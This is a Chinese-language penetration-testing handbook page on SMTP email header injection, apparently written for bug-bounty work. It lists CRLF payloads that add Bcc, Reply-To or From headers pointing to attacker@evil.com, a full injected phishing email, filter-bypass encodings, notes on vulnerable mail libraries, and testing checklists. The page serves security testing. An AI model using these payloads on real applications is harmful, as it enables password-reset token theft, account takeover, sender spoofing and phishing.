# Email Header Injection (SMTP 头注入) 深度手册

← 回主入口 [../../SKILL.md](../../SKILL.md)

> **CWE**: CWE-93 (CRLF) / CWE-88 | **OWASP**: WSTG-INPV-15 (变体) / A03:2021
> **核心**: 用户可控字段拼入 SMTP header, 通过 CRLF (`\r\n`) 注入额外 header / 正文, 劫持收件人或伪造发件人
> **赏金**: 中等 $500-$5000, 与找回密码 / 邀请流程结合时可升高到账号接管级

---

## 0. First-pass Payload Set

```
# 各种 CRLF 形态
%0D%0A       (URL 编码的 \r\n)
%0A          (纯 LF, 部分库只认 LF)
%E5%98%8A%E5%98%8D    (UTF-8 overlong 编码 CRLF, 绕过部分过滤)
\r\n
\n
```

典型注入 payload:

```
# 添加 Bcc 抄送到攻击者邮箱
foo@target.com%0D%0ABcc: attacker@evil.com

# 伪造 Reply-To
foo@target.com%0D%0AReply-To: attacker@evil.com

# 覆盖 From
foo@target.com%0D%0AFrom: admin@target.com

# 注入完整新邮件
foo@target.com%0D%0ASubject: Phishing%0D%0A%0D%0A<html>phishing content</html>
```

---

## 1. 识别触发点

**所有发邮件的业务都是候选**:

| 功能 | 注入点 |
|------|-------|
| 找回密码 (输邮箱发重置链接) | 邮箱输入框 |
| 邀请用户 (给好友发邀请) | 邀请邮箱 / 邀请信正文 |
| 订阅 / 取消订阅 | 邮箱字段 |
| 联系表单 / 工单 | name / subject / message |
| 账单 / 通知 | 收件人配置 |
| 支持 / 客服 | reply address |

---

## 2. SMTP Header 可注入列表

```
To: xxx
Cc: xxx            ← 可见抄送, 易被发现
Bcc: xxx           ← 密抄, 最好用 (受害者看不见)
From: xxx          ← 覆盖发件人 (需 SPF/DKIM 不严时成)
Reply-To: xxx      ← 回复跳到攻击者
Subject: xxx       ← 覆盖主题
Content-Type: xxx  ← 改 MIME (可发 HTML 钓鱼)
Return-Path: xxx
MIME-Version: xxx
Message-ID: xxx
```

注入 **空行 (`\r\n\r\n`)** 后, 后续内容变 **邮件正文**:
```
xxx%0D%0A%0D%0A<html><script>...</script></html>
```

---

## 3. 攻击模式

### 3.1 密码重置链接截获 (经典)

目标: 用户填自己邮箱 `victim@target.com`, 后端用 PHP `mail()` 发重置邮件。

攻击: 填写 `victim@target.com%0D%0ABcc: attacker@evil.com`

结果: 邮件同时发给 victim 和 attacker, attacker 拿到 reset token → 接管。

### 3.2 钓鱼邮件伪造

目标: 联系表单, 后端拼 `From: $user_email`。

攻击: `user_email = "ceo@target.com%0D%0A"`, subject/body 完全控制。

结果: 邮件显示来自 CEO, 用于针对 HR / 财务 的钓鱼。

### 3.3 邮件列表劫持

目标: 允许用户邀请他人订阅新闻。

攻击: `invitee = "a@a.com%0D%0ABcc: list1@target.com, list2@target.com, ..."`

结果: 系统邮件发到多个内部邮箱列表, 可用于垃圾邮件泛洪。

### 3.4 注入完整新邮件 (Subject + Body)

```
victim@target.com%0D%0ASubject: Urgent Wire Transfer%0D%0AContent-Type: text/html%0D%0A%0D%0A<h1>Click <a href='//evil.com'>here</a></h1>
```

配合伪造的 From, 构成完整钓鱼邮件。

---

## 4. 绕过过滤

### 4.1 编码变体

```
%0D%0A          标准 CRLF
%0A             仅 LF (PHP sendmail 很多只看 LF)
%0D             仅 CR
%E5%98%8A%E5%98%8D   overlong UTF-8
\u000D\u000A    Unicode 转义
\x0d\x0a        hex
```

### 4.2 函数层

不同语言的邮件函数对注入敏感度:

| 语言 / 库 | 防护情况 |
|-----------|---------|
| PHP `mail($to, $subj, $body, $headers)` | **$to/$subj 没过滤 CRLF, 典型漏洞** |
| PHP `mail()` + sanitize | 5.6+ `mail()` 的 4 参在某些版本部分校验, 但 $headers 仍可注 |
| PHPMailer >= 5.2.10 | 默认防护, 除非 `addAddress` 直接拼 |
| Node.js `nodemailer` | 默认过滤 CRLF, 但若手动拼 Headers 仍可 |
| Python `smtplib` + MIMEText | 手动拼 header 可注 |
| Java `JavaMail` | 默认校验, `InternetAddress` 抛异常, 但自定义 header 可注 |
| .NET `MailMessage` | 较安全, 但 `.Headers.Add(name, value)` 若 value 含 CRLF 可注 |

### 4.3 Host 与 Email 字段拼接

有些应用做 `email@host` 拼接, Host 是来源于请求 Host, 可结合 [host-header.md](host-header.md) 打:

```
Host: target.com%0D%0ABcc: evil@evil.com
```

---

## 5. 工具

### 5.1 Burp + 手工最佳

直接 Burp 改请求加 `%0D%0A...` payload, 发送, 观察邮件是否多发一份。

### 5.2 nuclei 模板

```bash
${NUCLEI_PATH}/nuclei.exe -t http/vulnerabilities/generic/crlf-injection.yaml -l urls.txt
# 注: CRLF 模板也能覆盖部分 email header injection 场景
```

### 5.3 自建 MX 接收

- 需要自己域名 + 简单 postfix / 收件服务 接收 `*@evil.com`
- 用 mailtrap.io / interactsh 的 SMTP 变体

---

## 6. Testing Checklist

- [ ] 所有邮箱输入字段(含 name / subject 若走邮件)都测 `%0D%0A` 注入
- [ ] 注册一个收件邮箱, 触发功能, 看是否收到 + 是否 Bcc 到攻击者邮箱
- [ ] `%0D%0A` / `%0A` / `%0D` 三种变体都测
- [ ] 测试 From 伪造 (若成功, 检查 SPF/DKIM 是否拦)
- [ ] 测试 Subject / Body 注入
- [ ] 检查 SMTP 响应 code (250 = 发送成功)
- [ ] 联合 Host header 攻击测密码重置投毒

---

## 7. False Positive Traps

| 陷阱 | 真相 |
|------|------|
| 邮件发成功但 Bcc 无效 | 库可能自行 escape, 非漏洞 |
| `%0D%0A` 被 URL 解码成原值但 SMTP 响应没变 | 服务端过滤了 newline, 试 overlong UTF-8 |
| 收到邮件但 From 没变 | 服务端可能硬编码 From, 即使 header 注入也被覆盖 |
| 邮件进垃圾箱 | 不代表注入失败, SPF/DKIM 不匹配反而证明 From 伪造成功 |
| `SMTP relay` 拒绝转发 | 外部 SMTP 有 relay 白名单, 但 Bcc 给内部邮箱仍可能成功 |

---

## 8. 影响证明

- **低**: SMTP 命令执行到, 但未实际送出
- **中**: 额外收件人 Bcc 成功, 攻击者邮箱收到重置邮件
- **高**: From 伪造成功 (SPF/DKIM 不严) + 钓鱼邮件被收件人信任
- **严重**: 密码重置链接被 Bcc 窃取 → 账号接管
- **严重**: 批量邮件列表劫持导致垃圾邮件 / 声誉损害 / 合规问题

---

## 9. 相关参考

- 主入口 → [../../SKILL.md](../../SKILL.md)
- Host Header 投毒 → [host-header.md](host-header.md)
- 认证逻辑(密码重置) → [../auth-logic.md](../auth-logic.md)
- CRLF / HTTP Response Splitting → [../waf-bypass.md](../waf-bypass.md) (有 CRLF 通用章节)

---

**CWE**: CWE-93 / CWE-88 | **WSTG**: INPV-15 | **CVSS 典型**: 6.5 (Bcc 注入) / 8.8 (密码重置接管路径)
